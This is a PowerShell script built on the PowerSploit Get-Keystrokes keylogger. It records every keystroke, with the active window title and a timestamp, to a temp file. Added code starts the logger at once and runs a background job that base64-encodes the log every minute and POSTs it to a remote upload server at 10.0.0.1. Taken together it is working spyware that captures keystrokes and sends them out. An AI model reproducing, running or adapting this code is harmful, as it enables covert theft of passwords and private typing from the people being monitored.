function Get-Keystrokes {
<#
.SYNOPSIS
 
    Logs keys pressed, time and the active window.
    
    PowerSploit Function: Get-Keystrokes
    Author: Chris Campbell (@obscuresec) and Matthew Graeber (@mattifestation)
    License: BSD 3-Clause
    Required Dependencies: None
    Optional Dependencies: None
    
.PARAMETER LogPath

    Specifies the path where pressed key details will be logged. By default, keystrokes are logged to %TEMP%\key.log.

.PARAMETER CollectionInterval

    Specifies the interval in minutes to capture keystrokes. By default, keystrokes are captured indefinitely.

.PARAMETER PollingInterval

    Specifies the time in milliseconds to wait between calls to GetAsyncKeyState. Defaults to 40 milliseconds.

.EXAMPLE

    Get-Keystrokes -LogPath C:\key.log

.EXAMPLE

    Get-Keystrokes -CollectionInterval 20

.EXAMPLE

    Get-Keystrokes -PollingInterval 35

.LINK

    http://www.obscuresec.com/
    http://www.exploit-monday.com/
#>
    [CmdletBinding()] Param (
        [Parameter(Position = 0)]
        [ValidateScript({Test-Path (Resolve-Path (Split-Path -Parent $_)) -PathType Container})]
        [String]
		$LogPath = "$env:TEMP\key.log",
        #$LogPath = "$($Env:TEMP)\key.log",
        #$LogPath = "C:\key.log",
		

        [Parameter(Position = 1)]
        [UInt32]
        $CollectionInterval
        
    )

    $LogPath = Join-Path (Resolve-Path (Split-Path -Parent $LogPath)) (Split-Path -Leaf $LogPath)

    Write-Verbose "Logging keystrokes to $LogPath"

    $Initilizer = {
		
        $LogPath = 'REPLACEME'

        '"TypedKey","Time","WindowTitle"' | Out-File -FilePath $LogPath -Encoding unicode

        function KeyLog {
			$PollingInterval = 1
			
            [Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms') | Out-Null

            try
            {
                $ImportDll = [User32]
            }
            catch
            {
                $DynAssembly = New-Object System.Reflection.AssemblyName('Win32Lib')
                $AssemblyBuilder = [AppDomain]::CurrentDomain.DefineDynamicAssembly($DynAssembly, [Reflection.Emit.AssemblyBuilderAccess]::Run)
                $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('Win32Lib', $False)
                $TypeBuilder = $ModuleBuilder.DefineType('User32', 'Public, Class')

                $DllImportConstructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor(@([String]))
                $FieldArray = [Reflection.FieldInfo[]] @(
                    [Runtime.InteropServices.DllImportAttribute].GetField('EntryPoint'),
                    [Runtime.InteropServices.DllImportAttribute].GetField('ExactSpelling'),
                    [Runtime.InteropServices.DllImportAttribute].GetField('SetLastError'),
                    [Runtime.InteropServices.DllImportAttribute].GetField('PreserveSig'),
                    [Runtime.InteropServices.DllImportAttribute].GetField('CallingConvention'),
                    [Runtime.InteropServices.DllImportAttribute].GetField('CharSet')
                )

                $PInvokeMethod = $TypeBuilder.DefineMethod('GetAsyncKeyState', 'Public, Static', [Int16], [Type[]] @([Windows.Forms.Keys]))
                $FieldValueArray = [Object[]] @(
                    'GetAsyncKeyState',
                    $True,
                    $False,
                    $True,
                    [Runtime.InteropServices.CallingConvention]::Winapi,
                    [Runtime.InteropServices.CharSet]::Auto
                )
                $CustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($DllImportConstructor, @('user32.dll'), $FieldArray, $FieldValueArray)
                $PInvokeMethod.SetCustomAttribute($CustomAttribute)

                $PInvokeMethod = $TypeBuilder.DefineMethod('GetKeyboardState', 'Public, Static', [Int32], [Type[]] @([Byte[]]))
                $FieldValueArray = [Object[]] @(
                    'GetKeyboardState',
                    $True,
                    $False,
                    $True,
                    [Runtime.InteropServices.CallingConvention]::Winapi,
                    [Runtime.InteropServices.CharSet]::Auto
                )
                $CustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($DllImportConstructor, @('user32.dll'), $FieldArray, $FieldValueArray)
                $PInvokeMethod.SetCustomAttribute($CustomAttribute)

                $PInvokeMethod = $TypeBuilder.DefineMethod('MapVirtualKey', 'Public, Static', [Int32], [Type[]] @([Int32], [Int32]))
                $FieldValueArray = [Object[]] @(
                    'MapVirtualKey',
                    $False,
                    $False,
                    $True,
                    [Runtime.InteropServices.CallingConvention]::Winapi,
                    [Runtime.InteropServices.CharSet]::Auto
                )
                $CustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($DllImportConstructor, @('user32.dll'), $FieldArray, $FieldValueArray)
                $PInvokeMethod.SetCustomAttribute($CustomAttribute)

                $PInvokeMethod = $TypeBuilder.DefineMethod('ToUnicode', 'Public, Static', [Int32],
                    [Type[]] @([UInt32], [UInt32], [Byte[]], [Text.StringBuilder], [Int32], [UInt32]))
                $FieldValueArray = [Object[]] @(
                    'ToUnicode',
                    $False,
                    $False,
                    $True,
                    [Runtime.InteropServices.CallingConvention]::Winapi,
                    [Runtime.InteropServices.CharSet]::Auto
                )
                $CustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($DllImportConstructor, @('user32.dll'), $FieldArray, $FieldValueArray)
                $PInvokeMethod.SetCustomAttribute($CustomAttribute)

                $PInvokeMethod = $TypeBuilder.DefineMethod('GetForegroundWindow', 'Public, Static', [IntPtr], [Type[]] @())
                $FieldValueArray = [Object[]] @(
                    'GetForegroundWindow',
                    $True,
                    $False,
                    $True,
                    [Runtime.InteropServices.CallingConvention]::Winapi,
                    [Runtime.InteropServices.CharSet]::Auto
                )
                $CustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($DllImportConstructor, @('user32.dll'), $FieldArray, $FieldValueArray)
                $PInvokeMethod.SetCustomAttribute($CustomAttribute)

                $ImportDll = $TypeBuilder.CreateType()
            }

            Start-Sleep -Milliseconds $PollingInterval

                try
                {
					$KeyState = @{}
                    #loop through typeable characters to see which is pressed
					if (-not $KeyState.ContainsKey("LeftShift"))   { $KeyState["LeftShift"] = $false }
					if (-not $KeyState.ContainsKey("RightShift"))  { $KeyState["RightShift"] = $false }
					
                    for ($TypeableChar = 1; $TypeableChar -le 254; $TypeableChar++)
                    {
                        $VirtualKey = $TypeableChar
						 if (!(($VirtualKey -ge 48 -and $VirtualKey -le 57) -or ($VirtualKey -ge 65 -and $VirtualKey -le 90) -or ($VirtualKey -ge 97 -and $VirtualKey -le 122) -or ($VirtualKey -eq 32))) {
							continue
						 }
                        $KeyResult = $ImportDll::GetAsyncKeyState($VirtualKey)

                        #if the key is pressed
                        if (($KeyResult -band 0x8000) -eq 0x8000)
                        {

                            #check for keys not mapped by virtual keyboard
                            $LeftCtrl     = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::LControlKey) -band 0x8000) -eq 0x8000
                            $RightCtrl    = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::RControlKey) -band 0x8000) -eq 0x8000 
							$LeftShift  = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::LShiftKey) -band 0x8000) -eq 0x8000
							$RightShift = ($ImportDll::GetAsyncKeyState([Windows.Forms.Keys]::RShiftKey) -band 0x8000) -eq 0x8000
							$CapsLock   = [Console]::CapsLock
							
							if ($LeftCtrl -and -not $KeyState["LeftCtrl"]) {
								$LogOutput += '[Ctrl]'
								$KeyState["LeftCtrl"] = $true
							} elseif (-not $LeftCtrl -and $KeyState["LeftCtrl"]) {
								$KeyState["LeftCtrl"] = $false
							}

							if ($RightCtrl -and -not $KeyState["RightCtrl"]) {
								$LogOutput += '[Ctrl]'
								$KeyState["RightCtrl"] = $true
							} elseif (-not $RightCtrl -and $KeyState["RightCtrl"]) {
								$KeyState["RightCtrl"] = $false
							}
							
                           
							if (-not $KeyState.ContainsKey($VirtualKey) -or -not $KeyState[$VirtualKey]) {
								$KeyState[$VirtualKey] = $true
								
								if($VirtualKey -eq 32) #special case for SpaceBar
								{
									$LogOutput += '[SpaceBar]'
								}
								else
								{
									$character = [char]$VirtualKey
									
									$isUppercase = ($LeftShift -or $RightShift) -xor $CapsLock
									if ($isUppercase) {
										$character = [char]::ToUpper($character)
									} else {
										$character = [char]::ToLower($character)
									}
									$LogOutput += ('[' + $character + ']')
								}
							}
							else
							{
								$KeyState[$VirtualKey] = $false	
							}

                            #get the title of the foreground window
                            $TopWindow = $ImportDll::GetForegroundWindow()
                            $WindowTitle = (Get-Process | Where-Object { $_.MainWindowHandle -eq $TopWindow }).MainWindowTitle

                            #get the current DTG
                            $TimeStamp = (Get-Date -Format dd/MM/yyyy:HH:mm:ss:ff)

                            #Create a custom object to store results
                            $ObjectProperties = @{'Key Typed' = $LogOutput;
                                                  'Time' = $TimeStamp;
                                                  'Window Title' = $WindowTitle}
                            $ResultsObject = New-Object -TypeName PSObject -Property $ObjectProperties

                            # Stupid hack since Export-CSV doesn't have an append switch in PSv2
                            $CSVEntry = ($ResultsObject | ConvertTo-Csv -NoTypeInformation)[1]

                            #return results
                            Out-File -FilePath $LogPath -Append -InputObject $CSVEntry -Encoding unicode

                        }
                    }
                }
                catch {}
            }
        }

    $Initilizer = [ScriptBlock]::Create(($Initilizer -replace 'REPLACEME', $LogPath))

    Start-Job -InitializationScript $Initilizer -ScriptBlock {for (;;) {Keylog}} -Name Keylogger | Out-Null

    if ($PSBoundParameters['CollectionInterval'])
    {
        $Timer = New-Object Timers.Timer($CollectionInterval * 60 * 1000)

        Register-ObjectEvent -InputObject $Timer -EventName Elapsed -SourceIdentifier ElapsedAction -Action {
            Stop-Job -Name Keylogger
            Unregister-Event -SourceIdentifier ElapsedAction
            $Sender.Stop()
        } | Out-Null
    }

}
# Start keystroke logging
Get-Keystrokes -LogPath "$env:TEMP\key.log"

$scriptBlock = {
	
# Define the path of the keystroke log file
$logFilePath = "$env:TEMP\key.log"
Write-Output "Monitoring keystroke log file: $logFilePath"

# Define the Flask server URL for file upload
$flaskUrl = "http://10.0.0.1/upload_log"
Write-Output "Flask server URL: $flaskUrl"


# Function to send the keystroke log file to Flask server
function Send-LogFile {
    if (Test-Path $logFilePath) {
        try {
            # Read the log file content
            $logContent = Get-Content -Path $logFilePath -Raw
            # Prepare JSON payload
            $payload = @{
                "log_name" = [System.IO.Path]::GetFileName($logFilePath)
                "log_data" = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($logContent))
            }
			
			$jsonPayload = $payload | ConvertTo-Json

            # Send JSON payload to Flask server
            $response = Invoke-RestMethod -Uri $flaskUrl -Method Post -ContentType "application/json" -Body $jsonPayload
            Write-Output "Log file successfully sent to server. Server response: $response"
            
        } catch {
            Write-Output "Error sending log file: $_"
        }
    } else {
        Write-Output "Log file not found at $logFilePath."
    }
}

# Polling function to check and send log file at intervals
function Poll-LogFile {
    while ($true) {
        Send-LogFile
        Start-Sleep -Seconds 60  # Check and send the log file every 60 seconds
    }
}

Poll-LogFile
}

# Start monitoring the log file as a background job
$logJob = Start-Job -ScriptBlock $scriptBlock
Write-Output "Background job for log file upload started with ID: $($logJob.Id)"
Write-Output "To monitor the job, use Get-Job and Receive-Job commands."